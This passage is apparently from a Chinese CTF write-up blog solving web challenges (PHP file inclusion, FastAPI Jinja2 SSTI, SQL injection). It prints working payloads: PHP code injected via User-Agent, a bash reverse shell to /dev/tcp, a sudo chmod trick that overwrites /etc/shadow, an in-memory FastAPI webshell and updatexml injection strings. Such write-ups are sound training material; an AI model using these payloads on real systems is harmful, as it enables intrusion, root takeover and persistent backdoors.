class="string">&quot;我不想看到php文件&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;怎么没有东西，这我改什么&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">tmpfile</span>();</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">fflush</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./uploads/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>],<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件重命名成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">files</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">        $<span class="title">files</span> = <span class="title">scandir</span>(&quot;./<span class="title">uploads</span>/&quot;);</span></span><br><span class="line"><span class="class">        <span class="title">foreach</span> ($<span class="title">files</span> <span class="title">as</span> $<span class="title">file</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="string">&#x27;./uploads/&#x27;</span> . <span class="variable">$file</span>)) &#123;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                    &lt;a href=<span class="string">&quot;./uploads/&lt;?=<span class="subst">$file</span>?&gt;&quot;</span>&gt;<span class="meta">&lt;?=</span><span class="variable">$file</span><span class="meta">?&gt;</span>&lt;/a&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> &#125;&#125;&#125; <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>我把无关紧要的html部分给删了！</p><p>先看第一个php块，就是一个只能上传图片的白名单检测</p><p>第二个php块关键部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./uploads/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>],<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>它会将读到的文件写入新的文件名，那不就直接任意文件读取了嘛xd</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?old<span class="built_in">_</span>name=/flag<span class="built_in">&amp;</span>new<span class="built_in">_</span>name=rufeii</span><br><span class="line">NSSCTF&#123;77e17714-ce59-431d-b605-0db30f8bbb50&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-include-revenge"><a href="#ez-include-revenge" class="headerlink" title="ez_include_revenge"></a>ez_include_revenge</h2><p>前面那道题的加强版</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">stream_wrapper_unregister</span>(<span class="string">&#x27;php&#x27;</span>);   <span class="comment">//禁用php流封装协议</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;no_hl&#x27;</span>])) <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$mkdir</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;mkdir -- &#x27;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$dir</span>));</span><br><span class="line">&#125;;                                   <span class="comment">//创建目录用的函数，后面接了个对&#x27;进行转义的函数</span></span><br><span class="line"><span class="variable">$randFolder</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable">$mkdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);        <span class="comment">//创建users/rand/目录并切到这个目录，也就是说此时网站根目录指向这个</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$userFolder</span> = (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="variable">$userFolder</span> = <span class="title function_ invoke__">basename</span>(<span class="title function_ invoke__">str_replace</span>([<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;-&#x27;</span>],[<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>],<span class="variable">$userFolder</span>));</span><br><span class="line"><span class="comment">//xff可以控制创建的目录，但是有替换，basename返回文件名部分，好像这里没什么用</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$mkdir</span>(<span class="variable">$userFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$userFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;profile&#x27;</span>,<span class="title function_ invoke__">print_r</span>(<span class="variable">$_SERVER</span>,<span class="literal">true</span>));   <span class="comment">//创建目录，并且在我们创建的目录下写入环境变量</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);       <span class="comment">//回到users/rand/</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);      <span class="comment">//过滤点</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;php&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f.*l.*a.*g/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这次不会让你得逞了！&quot;</span>;       <span class="comment">//flag被严格过滤，上个版本的不能打了</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;再想想?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="keyword">__DIR__</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf users/&#x27;</span>.<span class="variable">$randFolder</span>);     <span class="comment">//删除创建的目录</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>那么分析完源码，不能用点和php伪协议，试了一下data伪协议，<code>allow_url_include=0</code>直接限制死了远程包含都不行了，session包含暂且不说能不能过waf，我估计<strong>session.upload_progress.enabled</strong>这个没开，也打不了！下面打不通了，就只能考虑配合上面一起打了</p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p><code>file_put_contents(&#39;profile&#39;,print_r($_SERVER,true));</code>能不能利用这个文件呢？</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -i -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; -H &quot;X-Forwarded-For: rufeii&quot; &quot;http://node10.anna.nssctf.cn:20167/?page=rufeii/profile&quot;</span><br><span class="line">这个不行肯定会被检测到</span><br><span class="line">curl -i -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; -H &quot;X-Forwarded-For: .&quot; &quot;http://node10.anna.nssctf.cn:20167/?page=profile&quot;但是这个就打出来了非预期说是</span><br></pre></td></tr></table></figure><p>莫名其妙，所以说还是要多去尝试，看似不可能实则也有可能！</p><p>为什么会出现非预期？</p><p><img src="/images/achieve/2025/11/4.png"></p><p>file_gets_contents只会在工作目录找！</p><p><img src="/images/achieve/2025/11/5.png"></p><p>mkdir无法递归创建目录除非使用-p参数。那么前面的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$randFolder</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable">$mkdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>); </span><br></pre></td></tr></table></figure><p>就是没用的，这点其实在报错中也可以体现！然后如果xff为空profile就写在html目录下，chdir(‘..’)到www，所以此时工作目录是www！脚本目录是html！file_gets_contents在工作目录肯定找不到profile，但是include会去脚本目录找，所以直接绕过。</p><p>也就是说我们把profile写到了脚本目录去（&#x2F;var&#x2F;www&#x2F;html&#x2F;profile），然后工作目录不是脚本目录的时候就可以绕过！利用的是这两个函数处理的差异性！</p><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>前面说到是因为少了-p参数不能递归创造目录，导致profile写到了脚本目录，如果有的话，肯定上面的打法就失效了！那么就是预期的打法！</p><p>预期打法就是利用这两个玩意对伪协议检测差异！</p><blockquote><p>file_get_contens对data协议的检测data:[<mediatype>][;base64],<data><br>include [协议头]:&#x2F;&#x2F;这个才能检测成伪协议</p></blockquote><p>也就是说我们把文件名命名为这种形式是不是就可以让<code>file_get_contents</code>认为是伪协议，但是include会去包含！所以甚牛而逼之！</p><p>payload：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;X-Forwarded-For: data:,rufeii&quot; -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; &quot;http://node9.anna.nssctf.cn:25670/?page=data:,rufeii/profile&quot;</span><br></pre></td></tr></table></figure><h2 id="ez-fastapi"><a href="#ez-fastapi" class="headerlink" title="ez_fastapi"></a>ez_fastapi</h2><h3 id="非预期-1"><a href="#非预期-1" class="headerlink" title="非预期"></a>非预期</h3><p>这题的非预期是出网反弹shell</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> HTMLResponse, JSONResponse</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line">Jinja2 = Environment()</span><br><span class="line"></span><br><span class="line">Jinja2 = Environment(</span><br><span class="line">    variable_start_string=<span class="string">&#x27;&#123;&#x27;</span>,</span><br><span class="line">    variable_end_string=<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.exception_handler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handler_404</span>(<span class="params">request, exc</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;not found!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> JSONResponse(</span><br><span class="line">        status_code=<span class="number">404</span>,</span><br><span class="line">        content=&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Not found&quot;</span>&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&#x27;http&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">say_hello</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    response.headers[<span class="string">&#x27;say1&#x27;</span>] = <span class="string">&#x27;hello!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&#x27;http&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">say_hi</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    response.headers[<span class="string">&#x27;say2&#x27;</span>] = <span class="string">&#x27;hi!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hello World&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/shellMe&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">shellMe</span>(<span class="params">username=<span class="string">&quot;Guest&quot;</span></span>):</span><br><span class="line">    Jinja2.from_string(<span class="string">&quot;Welcome &quot;</span> + username).render()</span><br><span class="line">    <span class="keyword">return</span> HTMLResponse(content=<span class="string">&quot;&lt;h1&gt;Welcome!&lt;/h1&gt;&lt;p&gt;Request processed.&lt;/p&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">method_disabled</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;此路不通！该方法已被管理员禁用。&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.add_api_route = method_disabled</span><br><span class="line">app.add_middleware = method_disabled</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    uvicorn.run(app, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>由于没回显，本地调成有回显的方便找东西，最后exp：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;self.<span class="built_in">_</span><span class="built_in">_</span>dict<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span>TemplateReference<span class="built_in">_</span><span class="built_in">_</span>context.keys()&#125;先用这个看下有哪些内置的东西可以使用</span><br><span class="line">用bash -c &quot;bash -i &gt;<span class="built_in">&amp;</span>/dev/tcp/ip/port 0&gt;<span class="built_in">&amp;</span>1&quot;去弹shell</span><br><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(&#x27;bash -c &quot;bash -i &gt;<span class="built_in">&amp;</span>/dev/tcp/ip/port 0&gt;<span class="built_in">&amp;</span>1&quot;&#x27;).read()&#125;注意url编码一下就好了</span><br></pre></td></tr></table></figure><p>哈哈拿到shell之后flag就在跟目录下，但是没有权限！先看下能不能suid提权，但是没有好的suid提权命令！</p><p>sudo 提权</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo -l发现可以用chmod命令提权，这是一个设置文件权限的命令，对于这道题来说我们只需要</span><br><span class="line">chmod 764 /flag 就可以直接读了</span><br><span class="line">拿下整台机子</span><br><span class="line">chmod 766 /etc/shadow</span><br><span class="line">echo &#x27;root:<span class="built_in">$</span>1<span class="built_in">$</span>flag<span class="built_in">$</span>Qiv1fGuuojJhoMNhwWehP.:18000:0:99999:7:::&#x27; &gt; /etc/shadow</span><br><span class="line">然后su root（密码就是我们改的root）这样就拿下了</span><br></pre></td></tr></table></figure><p><img src="/images/achieve/2025/11/6.png"></p><h3 id="预期-1"><a href="#预期-1" class="headerlink" title="预期"></a>预期</h3><p>那么说到非预期是出网打反弹shell，那么预期自然就是不出网打内存马呗！</p><p>这里就不是flask框架下的内存马了，是FaskAPI框架！参考：<a href="https://www.caterpie771.cn/archives/333#%E7%BB%8F%E5%85%B8%E8%B7%AF%E7%BA%BF%EF%BC%9A%E6%89%93%E8%B7%AF%E7%94%B1%E6%B7%BB%E5%8A%A0%E5%87%BD%E6%95%B0">FastAPI 内存马的研究 - caterpie的小站</a></p><ol><li>经典路线打路由添加函数</li><li>新路线的探究</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.add_api_route = method_disabled</span><br><span class="line">app.add_middleware = method_disabled</span><br></pre></td></tr></table></figure><p>只能打第二种了，这次当回脚本小子！感觉挺有意思的，打算后面研究一下</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.middleware<span class="built_in">_</span>stack.app.app.app.add<span class="built_in">_</span>exception<span class="built_in">_</span>handler(404,lambda request,exc:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;JSONResponse&#x27;](content=&#123;&#x27;message&#x27;:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(request.query<span class="built_in">_</span>params.get(&#x27;cmd&#x27;) or &#x27;whoami&#x27;).read()&#125;))&quot;)&#125;</span><br></pre></td></tr></table></figure><p>这个payload我在本地打通了，放到远程就打不通了！后面一步一步fuzz，发现是中间件的问题，就一个app</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.middleware<span class="built_in">_</span>stack.app.add<span class="built_in">_</span>exception<span class="built_in">_</span>handler(404,lambda request,exc:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;JSONResponse&#x27;](content=&#123;&#x27;message&#x27;:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(request.query<span class="built_in">_</span>params.get(&#x27;cmd&#x27;) or &#x27;whoami&#x27;).read()&#125;))&quot;)&#125;</span><br></pre></td></tr></table></figure><p>byd还是打不通，还是一步步测试，发现题目<code>sys.modules[&#39;__main__&#39;]</code>下面没有app，真奇怪，难道是bao师傅把它删了？后面BR师傅说是在app模块压根就不在main模块，但是本地为什么可以呢？</p><p>附件里面还有个start.sh被我忽略了</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec uvicorn app:app --host 0.0.0.0 --port 8000</span><br></pre></td></tr></table></figure><p><code>uvicorn</code>用于启动 Uvicorn ASGI 服务器，<code>app:app</code>格式是<code>module_name:variable_name</code></p><p>所以本质上它是通过这个起的服务，我本地就是运行python脚本起的服务自然不一样</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;app&#x27;].app.middleware<span class="built_in">_</span>stack.app.add<span class="built_in">_</span>exception<span class="built_in">_</span>handler(404,lambda request,exc:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;app&#x27;].app.<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;JSONResponse&#x27;](content=&#123;&#x27;message&#x27;:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(request.query<span class="built_in">_</span>params.get(&#x27;cmd&#x27;) or &#x27;whoami&#x27;).read()&#125;))&quot;)&#125;</span><br></pre></td></tr></table></figure><p>这样就打通了</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这道题还是很不错的，增加了我对ssti，反弹shell，linux提权，内存马的理解！</p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti </tag>
            
            <tag> fastapi内存马 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> sudo提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RootersCTF2019</title>
      <link href="/2025/10/30/RootersCTF2019/"/>
      <url>/2025/10/30/RootersCTF2019/</url>
      
        <content type="html"><![CDATA[<h2 id="RootersCTF2019-I"><a href="#RootersCTF2019-I" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>一道ssti，需要用工具扫参数（结果是?name）</p><p>然后直接秒了就行了，因为基本上没过滤什么！没什么说的！</p><h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p>过滤</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SLEEP &#x27; &quot; OR - BENCHMARK</span><br></pre></td></tr></table></figure><p>一开始还不知道什么意思，后面才知道输入的原来是密码，那么就试试万能密码呗</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 || 1=1 limit 0,1<span class="params">#</span></span><br></pre></td></tr></table></figure><p>页面回显只能回显一条数据，所以用个limit</p><p>然后就是报错也可以</p><p>过滤引号，字段填表那里用16进制就好了</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字段：1 || updatexml(1,concat(0x7e,(select group<span class="built_in">_</span>concat(column<span class="built_in">_</span>name)from information<span class="built_in">_</span>schema.columns where table<span class="built_in">_</span>schema=database() and table<span class="built_in">_</span>name=0x7573657273),0x7e),1)<span class="params">#</span></span><br><span class="line">密码：1 || updatexml(1,concat(0x7e,(select group<span class="built_in">_</span>concat(uniqueid) from users),0x7e),1)<span class="params">#</span></span><br></pre></td></tr></table></figure><p>然后拿第一个去查询就好了！</p><h2 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h2><p>注册登录，然后一个文件上传接口！</p><p>后缀名没啥过滤啊，尝试php后缀，虽然传上去了，但是访问就是下载说明没解析！那就只能在试试图片马了，但是话又说回来，php解析不了，肯定用不了.user.ini了！</p><p>后面发现cookie部分是个jwt，那么肯定就是jwt伪造了！一开始是用脚本改加密但是不行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># 能进行base64的加密解密都是字节类型</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jwtBase64Encode</span>(<span class="params">x</span>):</span><br><span 